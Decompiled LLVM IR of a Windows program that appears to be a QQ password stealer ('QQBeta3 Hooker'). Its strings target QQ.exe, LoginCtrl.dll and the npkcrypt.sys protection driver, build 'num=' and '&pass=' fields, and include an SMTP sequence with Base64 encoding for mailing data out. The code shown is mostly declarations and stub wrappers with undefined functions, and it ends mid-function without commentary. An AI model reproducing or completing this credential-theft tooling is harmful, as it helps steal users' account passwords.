source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_4065ac = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_4065b8 = constant i32 47
@global_var_4065f8 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406604 = constant [5 x i8] c"num=\00"
@global_var_406614 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_4066d0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4066e0 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4067f0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406800 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406808 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406a7c = local_unnamed_addr constant [11 x i8] c"xiaran.obj\00"
@global_var_406a90 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406a9c = local_unnamed_addr constant i32 47
@global_var_406888 = local_unnamed_addr constant i32 4221068
@global_var_40688c = local_unnamed_addr constant i32 841875985
@global_var_406bbc = local_unnamed_addr constant [10 x i8] c"rejoi.obj\00"
@global_var_406bd0 = constant i32 47
@global_var_406bdc = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4071b4 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407260 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_4073e8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_4073f4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_4078d4 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_4078f8 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_40798c = constant [11 x i8] c"user32.dll\00"
@global_var_407998 = constant [11 x i8] c"LoadImageA\00"
@global_var_4079a4 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407584 = local_unnamed_addr constant i32 4224464
@global_var_4075d0 = local_unnamed_addr constant i32 1867011080
@global_var_4079b4 = constant [12 x i8] c"LoadStringA\00"
@global_var_4079c0 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_4079cc = constant [12 x i8] c"shell32.dll\00"
@global_var_4079d8 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_4079e8 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_407a84 = local_unnamed_addr constant i32 30
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407e24 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407e34 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e4c = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e64 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e74 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e84 = constant [8 x i8] c"ListBox\00"
@global_var_409808 = global i32 0
@global_var_407e94 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f8 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

